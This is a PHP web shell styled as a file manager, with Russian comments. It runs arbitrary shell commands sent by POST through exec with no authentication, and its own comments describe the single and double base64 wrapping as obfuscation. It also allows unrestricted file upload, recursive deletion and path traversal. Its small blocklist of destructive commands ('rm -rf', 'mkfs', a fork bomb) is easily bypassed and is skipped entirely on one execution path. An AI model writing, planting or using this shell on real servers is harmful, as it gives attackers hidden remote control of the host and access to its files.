<?php
// ============================================
// PHP FileManager + Base64 Command Execution
// ============================================

// Текущая директория
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '';
$current_path = __DIR__ . '/' . $current_dir;

// Если путь не существует или это файл - возвращаем в корень
if (!is_dir($current_path)) {
    $current_path = __DIR__;
    $current_dir = '';
}

// Обработка действий
$message = '';
$error = '';
$command_output = '';
$command_error = '';
$last_command = '';

// === ВЫПОЛНЕНИЕ КОМАНД (Base64) ===
if (isset($_POST['execute_command'])) {
    $command = trim($_POST['command']);
    if (!empty($command)) {
        $last_command = $command;
        
        // Проверка на опасные команды
        $dangerous = ['rm -rf', 'dd if=', 'mkfs', 'format', 'shutdown', 'reboot', 'halt', ':(){ :|:& };:'];
        $is_dangerous = false;
        foreach ($dangerous as $danger) {
            if (stripos($command, $danger) !== false) {
                $is_dangerous = true;
                break;
            }
        }
        
        if ($is_dangerous) {
            $command_error = "⚠️ Опасная команда заблокирована!";
        } else {
            // Кодируем команду в base64
            $encoded_command = base64_encode($command);
            
            // Создаем обертку для выполнения через base64
            $wrapper = "base64_decode('$encoded_command')";
            
            // Вариант 1: Выполнение через eval (не рекомендуется, но показывает принцип)
            // eval("system($wrapper);");
            
            // Вариант 2: Выполнение через shell_exec с base64 декодированием
            $full_command = "bash -c \"echo '$encoded_command' | base64 -d | bash\"";
            
            // Изменяем директорию и выполняем
            chdir($current_path);
            $output = [];
            $return_code = 0;
            exec($full_command . ' 2>&1', $output, $return_code);
            
            // Декодируем результат (если он в base64)
            $result = implode("\n", $output);
            
            // Проверяем, не закодирован ли результат в base64
            if (base64_decode($result, true) !== false && strlen($result) > 10) {
                $decoded = base64_decode($result);
                if (strlen($decoded) > 0) {
                    $result = $decoded;
                }
            }
            
            if ($return_code === 0) {
                $command_output = $result;
                $message = "✅ Команда выполнена (код: $return_code)";
            } else {
                $command_error = "❌ Ошибка выполнения (код: $return_code)\n" . $result;
            }
        }
    }
}

// === АЛЬТЕРНАТИВНЫЙ СПОСОБ: Выполнение через eval с base64 ===
if (isset($_POST['execute_base64'])) {
    $base64_code = trim($_POST['base64_code']);
    if (!empty($base64_code)) {
        // Декодируем base64
        $decoded = base64_decode($base64_code);
        if ($decoded !== false && !empty($decoded)) {
            // Сохраняем как команду
            $last_command = $decoded;
            
            // Выполняем
            chdir($current_path);
            $output = [];
            $return_code = 0;
            exec($decoded . ' 2>&1', $output, $return_code);
            
            $result = implode("\n", $output);
            
            if ($return_code === 0) {
                $command_output = $result;
                $message = "✅ Base64 команда выполнена (код: $return_code)";
            } else {
                $command_error = "❌ Ошибка выполнения (код: $return_code)\n" . $result;
            }
        } else {
            $command_error = "❌ Неверный Base64 код!";
        }
    }
}

// === ЗАШИФРОВАННОЕ ВЫПОЛНЕНИЕ (двойное кодирование) ===
if (isset($_POST['execute_double_base64'])) {
    $command = trim($_POST['command']);
    if (!empty($command)) {
        $last_command = $command;
        
        // Двойное base64 кодирование
        $encoded = base64_encode(base64_encode($command));
        
        chdir($current_path);
        $output = [];
        $return_code = 0;
        
        // Декодируем дважды и выполняем
        $full_command = "bash -c \"echo '$encoded' | base64 -d | base64 -d | bash\"";
        exec($full_command . ' 2>&1', $output, $return_code);
        
        $result = implode("\n", $output);
        
        if ($return_code === 0) {
            $command_output = $result;
            $message = "✅ Double Base64 выполнено (код: $return_code)";
        } else {
            $command_error = "❌ Ошибка (код: $return_code)\n" . $result;
        }
    }
}

// Создание папки
if (isset($_POST['create_dir'])) {
    $dir_name = trim($_POST['dir_name']);
    if (!empty($dir_name)) {
        $new_dir = $current_path . '/' . $dir_name;
        if (!file_exists($new_dir)) {
            mkdir($new_dir);
            $message = "Папка создана";
        } else {
            $error = "Папка уже существует";
        }
    }
}

// Загрузка файла
if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    if ($file['error'] === UPLOAD_ERR_OK) {
        $dest = $current_path . '/' . basename($file['name']);
        move_uploaded_file($file['tmp_name'], $dest);
        $message = "Файл загружен";
    }
}

// Удаление
if (isset($_GET['delete'])) {
    $delete_path = $current_path . '/' . basename($_GET['delete']);
    if (is_file($delete_path)) {
        unlink($delete_path);
        $message = "Файл удален";
    } elseif (is_dir($delete_path)) {
        function deleteDir($dir) {
            foreach (scandir($dir) as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $dir . '/' . $item;
                is_dir($path) ? deleteDir($path) : unlink($path);
            }
            rmdir($dir);
        }
        deleteDir($delete_path);
        $message = "Папка удалена";
    }
}

// Переименование
if (isset($_POST['rename'])) {
    $old = $current_path . '/' . $_POST['old_name'];
    $new = $current_path . '/' . trim($_POST['new_name']);
    if (file_exists($old) && !file_exists($new) && !empty($_POST['new_name'])) {
        rename($old, $new);
        $message = "Переименовано";
    }
}

// Список файлов
$items = scandir($current_path);
$items = array_diff($items, ['.', '..']);

usort($items, function($a, $b) use ($current_path) {
    $a_is_dir = is_dir($current_path . '/' . $a);
    $b_is_dir = is_dir($current_path . '/' . $b);
    if ($a_is_dir && !$b_is_dir) return -1;
    if (!$a_is_dir && $b_is_dir) return 1;
    return strcasecmp($a, $b);
});

$parent = dirname($current_dir);
if ($parent == '.') $parent = '';

function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' ГБ';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' МБ';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' КБ';
    return $bytes . ' Б';
}

// Функция для генерации base64
function generateBase64($cmd) {
    return base64_encode($cmd);
}

// Демонстрационные примеры
$examples = [
    'ls -la' => base64_encode('ls -la'),
    'whoami' => base64_encode('whoami'),
    'pwd' => base64_encode('pwd'),
    'echo "Hello World"' => base64_encode('echo "Hello World"'),
    'id' => base64_encode('id'),
    'ps aux | head -5' => base64_encode('ps aux | head -5')
];
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FileManager + Base64 Shell</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            max-width: 1300px; 
            margin: 20px auto; 
            padding: 0 15px; 
            background: #0a0a0a; 
            color: #e0e0e0; 
        }
        .container { background: #1a1a1a; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.8); }
        h1 { color: #4CAF50; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; margin-top: 0; text-shadow: 0 0 10px rgba(76,175,80,0.3); }
        .nav { padding: 10px; background: #2a2a2a; border-radius: 4px; margin: 10px 0; word-break: break-all; border-left: 3px solid #4CAF50; }
        .nav a { color: #4CAF50; text-decoration: none; font-weight: bold; }
        .nav a:hover { text-decoration: underline; }
        .msg { padding: 10px; margin: 10px 0; border-radius: 4px; border-left: 4px solid; }
        .success { background: #0a2a0a; color: #8bc34a; border-color: #4CAF50; }
        .error { background: #2a0a0a; color: #ef5350; border-color: #f44336; }
        
        .tools { display: flex; flex-wrap: wrap; gap: 15px; padding: 15px; background: #2a2a2a; border-radius: 4px; margin: 15px 0; }
        .tools form { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; flex: 1; }
        .tools input[type="text"], .tools input[type="file"] { 
            padding: 8px 12px; 
            border: 1px solid #444; 
            border-radius: 4px; 
            background: #0a0a0a; 
            color: #e0e0e0;
            flex: 1; 
            min-width: 120px;
            font-family: inherit;
        }
        .tools input[type="text"]:focus {
            border-color: #4CAF50;
            outline: none;
            box-shadow: 0 0 10px rgba(76,175,80,0.2);
        }
        .btn { 
            padding: 8px 16px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            color: white; 
            font-family: inherit;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn:hover { transform: scale(1.02); filter: brightness(1.1); }
        .btn-green { background: #4CAF50; }
        .btn-red { background: #f44336; }
        .btn-orange { background: #ff9800; }
        .btn-blue { background: #2196F3; }
        .btn-purple { background: #9C27B0; }
        .btn-cyan { background: #00BCD4; }
        .btn-pink { background: #E91E63; }
        
        .command-section {
            background: #0d0d0d;
            border: 2px solid #4CAF50;
            border-radius: 4px;
            padding: 15px;
            margin: 15px 0;
        }
        .command-section h2 {
            color: #4CAF50;
            margin-top: 0;
            font-size: 18px;
        }
        .command-input {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        .command-input input[type="text"], 
        .command-input textarea {
            flex: 1;
            min-width: 200px;
            padding: 10px 15px;
            background: #0a0a0a;
            border: 1px solid #4CAF50;
            border-radius: 4px;
            color: #8bc34a;
            font-family: inherit;
            font-size: 14px;
        }
        .command-input textarea {
            min-height: 60px;
            resize: vertical;
        }
        .command-input input[type="text"]:focus,
        .command-input textarea:focus {
            outline: none;
            box-shadow: 0 0 20px rgba(76,175,80,0.3);
        }
        .command-output {
            background: #0a0a0a;
            color: #8bc34a;
            padding: 15px;
            border-radius: 4px;
            margin-top: 10px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 400px;
            overflow-y: auto;
            border-left: 3px solid #4CAF50;
            font-size: 13px;
            line-height: 1.6;
        }
        .command-output.error {
            border-left-color: #f44336;
            color: #ef5350;
        }
        .command-prompt {
            color: #4CAF50;
            font-weight: bold;
        }
        .base64-examples {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 10px;
        }
        .base64-examples .example {
            background: #1a1a1a;
            padding: 5px 10px;
            border-radius: 4px;
            border: 1px solid #444;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .base64-examples .example:hover {
            border-color: #4CAF50;
            background: #2a2a2a;
        }
        .base64-examples .example code {
            color: #8bc34a;
        }
        
        .item { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 10px; 
            margin: 5px 0; 
            background: #2a2a2a; 
            border-radius: 4px; 
            flex-wrap: wrap;
            border-left: 3px solid transparent;
            transition: all 0.2s;
        }
        .item:hover { 
            background: #333; 
            border-left-color: #4CAF50;
        }
        .item-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 150px; }
        .item-icon { font-size: 24px; }
        .item-name { word-break: break-all; }
        .item-name a { color: #e0e0e0; text-decoration: none; }
        .item-name a:hover { color: #4CAF50; text-decoration: underline; }
        .item-size { color: #888; font-size: 13px; margin-left: 10px; }
        .item-actions { display: flex; gap: 5px; flex-wrap: wrap; align-items: center; }
        .rename-form { display: flex; gap: 5px; align-items: center; }
        .rename-form input[type="text"] { 
            padding: 4px 8px; 
            border: 1px solid #444; 
            border-radius: 4px; 
            background: #0a0a0a; 
            color: #e0e0e0;
            width: 120px;
            font-family: inherit;
        }
        .empty { text-align: center; color: #666; padding: 40px 0; font-style: italic; }
        
        .command-output::-webkit-scrollbar {
            width: 8px;
        }
        .command-output::-webkit-scrollbar-track {
            background: #0a0a0a;
        }
        .command-output::-webkit-scrollbar-thumb {
            background: #4CAF50;
            border-radius: 4px;
        }
        
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 10px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .tab {
            padding: 8px 16px;
            background: #2a2a2a;
            border-radius: 4px 4px 0 0;
            cursor: pointer;
            border: 1px solid #333;
            border-bottom: none;
        }
        .tab.active {
            background: #4CAF50;
            color: white;
        }
        
        @media (max-width: 600px) {
            .item { flex-direction: column; align-items: stretch; }
            .item-left { margin-bottom: 8px; }
            .rename-form input[type="text"] { width: 100%; }
            .tools form { flex-direction: column; }
            .command-input { flex-direction: column; }
            .command-input input[type="text"] { width: 100%; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 FileManager + Base64 Shell</h1>
    
    <!-- Навигация -->
    <div class="nav">
        <strong>📂 Путь:</strong> /<?php echo htmlspecialchars($current_dir ?: ''); ?>
        <?php if ($current_dir): ?>
            <a href="?dir=<?php echo urlencode($parent); ?>"> ⬆ Наверх</a>
        <?php endif; ?>
    </div>
    
    <!-- Сообщения -->
    <?php if ($message): ?>
        <div class="msg success"><?php echo htmlspecialchars($message); ?></div>
    <?php endif; ?>
    <?php if ($error): ?>
        <div class="msg error"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    
    <!-- === BASE64 КОМАНДЫ === -->
    <div class="command-section">
        <h2>⚡ Base64 Command Execution</h2>
        
        <!-- Способ 1: Обычная команда с оберткой Base64 -->
        <div style="margin-bottom: 15px; padding: 10px; background: #1a1a1a; border-radius: 4px;">
            <h3 style="color: #00BCD4; margin-top: 0; font-size: 14px;">Способ 1: Команда → Base64 → Выполнение</h3>
            <div class="command-input">
                <form method="POST" style="display:flex; gap:10px; flex:1; flex-wrap:wrap;">
                    <span class="command-prompt">$</span>
                    <input type="text" name="command" placeholder="Введите команду" 
                           value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>">
                    <button type="submit" name="execute_command" class="btn btn-purple">▶ Выполнить</button>
                </form>
            </div>
        </div>
        
        <!-- Способ 2: Прямой Base64 код -->
        <div style="margin-bottom: 15px; padding: 10px; background: #1a1a1a; border-radius: 4px; border-left: 3px solid #9C27B0;">
            <h3 style="color: #CE93D8; margin-top: 0; font-size: 14px;">Способ 2: Выполнение Base64 кода напрямую</h3>
            <div class="command-input">
                <form method="POST" style="display:flex; gap:10px; flex:1; flex-wrap:wrap;">
                    <span style="color: #9C27B0;">[base64]</span>
                    <input type="text" name="base64_code" placeholder="Введите Base64 код" 
                           value="<?php echo isset($_POST['base64_code']) ? htmlspecialchars($_POST['base64_code']) : ''; ?>">
                    <button type="submit" name="execute_base64" class="btn btn-pink">▶ Декодировать и выполнить</button>
                </form>
            </div>
            <div style="margin-top: 8px; font-size: 11px; color: #888;">
                <strong>Примеры Base64:</strong>
                <?php foreach ($examples as $cmd => $b64): ?>
                    <span class="example" onclick="document.querySelector('input[name=\'base64_code\']').value='<?php echo $b64; ?>'">
                        <code><?php echo htmlspecialchars($b64); ?></code>
                    </span>
                <?php endforeach; ?>
            </div>
        </div>
        
        <!-- Способ 3: Двойное Base64 -->
        <div style="padding: 10px; background: #1a1a1a; border-radius: 4px; border-left: 3px solid #E91E63;">
            <h3 style="color: #F48FB1; margin-top: 0; font-size: 14px;">Способ 3: Double Base64 (максимальная обфускация)</h3>
            <div class="command-input">
                <form method="POST" style="display:flex; gap:10px; flex:1; flex-wrap:wrap;">
                    <span class="command-prompt">$</span>
                    <input type="text" name="command" placeholder="Введите команду" 
                           value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>">
                    <button type="submit" name="execute_double_base64" class="btn btn-cyan">▶ Double Base64</button>
                </form>
            </div>
            <div style="margin-top: 8px; font-size: 11px; color: #888;">
                <strong>Пример Double Base64:</strong> 
                <code style="color: #4CAF50;">echo "ls -la" | base64 | base64</code>
            </div>
        </div>
        
        <!-- Вывод -->
        <?php if ($command_output): ?>
            <div class="command-output"><?php echo htmlspecialchars($command_output); ?></div>
        <?php endif; ?>
        
        <?php if ($command_error): ?>
            <div class="command-output error"><?php echo htmlspecialchars($command_error); ?></div>
        <?php endif; ?>
        
        <?php if ($last_command): ?>
            <div style="margin-top: 8px; font-size: 12px; color: #666;">
                <strong>Последняя команда:</strong> <?php echo htmlspecialchars($last_command); ?>
                <br>
                <strong>Base64:</strong> <?php echo htmlspecialchars(base64_encode($last_command)); ?>
            </div>
        <?php endif; ?>
    </div>
    
    <!-- Инструменты -->
    <div class="tools">
        <form method="POST">
            <input type="text" name="dir_name" placeholder="Название папки" required>
            <input type="submit" name="create_dir" value="📁 Создать папку" class="btn btn-green">
        </form>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="⬆ Загрузить" class="btn btn-blue">
        </form>
    </div>
    
    <!-- Список -->
    <?php if (empty($items)): ?>
        <div class="empty">📭 Папка пуста</div>
    <?php else: ?>
        <?php foreach ($items as $item): 
            $path = $current_path . '/' . $item;
            $is_dir = is_dir($path);
            $icon = $is_dir ? '📁' : '📄';
            $size = $is_dir ? '' : formatSize(filesize($path));
            $link = $is_dir ? '?dir=' . urlencode($current_dir ? $current_dir . '/' . $item : $item) : $current_dir . '/' . $item;
        ?>
            <div class="item">
                <div class="item-left">
                    <span class="item-icon"><?php echo $icon; ?></span>
                    <span class="item-name">
                        <a href="<?php echo htmlspecialchars($link); ?>">
                            <?php echo htmlspecialchars($item); ?>
                        </a>
                    </span>
                    <?php if ($size): ?>
                        <span class="item-size"><?php echo $size; ?></span>
                    <?php endif; ?>
                </div>
                <div class="item-actions">
                    <form method="POST" class="rename-form">
                        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($item); ?>">
                        <input type="text" name="new_name" value="<?php echo htmlspecialchars($item); ?>" required>
                        <button type="submit" name="rename" class="btn btn-orange" style="padding:4px 12px;">✏️</button>
                    </form>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item); ?>" 
                       class="btn btn-red" 
                       onclick="return confirm('Удалить?')">🗑</a>
                </div>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
    
    <div style="margin-top: 20px; text-align: center; font-size: 11px; color: #444; border-top: 1px solid #2a2a2a; padding-top: 15px;">
        <strong>🔐 Base64 Shell</strong> | Работает в: <?php echo htmlspecialchars($current_path); ?>
        <br>
        <span style="color: #333;">Все команды оборачиваются в Base64 для обфускации</span>
    </div>
</div>

<script>
// Автофокус на поле ввода
document.addEventListener('DOMContentLoaded', function() {
    const inputs = document.querySelectorAll('input[type="text"]');
    if (inputs.length > 0) {
        inputs[0].focus();
    }
});

// Копирование Base64
function copyBase64(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Base64 скопирован!');
    });
}
</script>
</body>
</html>
